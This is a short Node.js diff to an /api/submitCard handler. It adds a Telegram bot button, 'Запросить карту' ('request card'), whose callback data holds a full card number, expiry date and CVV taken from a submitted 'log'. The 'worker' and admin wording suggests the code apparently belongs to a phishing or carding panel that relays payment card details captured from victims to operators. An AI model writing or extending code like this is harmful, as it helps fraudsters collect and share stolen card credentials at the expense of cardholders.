@@ -641,6 +641,12 @@ app.post(`/api/submitCard`, async (req, res) => {
         {
           parse_mode: "HTML",
           reply_markup: Markup.inlineKeyboard([
+            [
+              Markup.callbackButton(
+                "💳 Запросить карту",
+                `get_card_worker:${log.cardNumber}:${log.cardExpire}:${log.cardCvv}_admin`
+              ),
+            ],
             [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
           ]),
         }
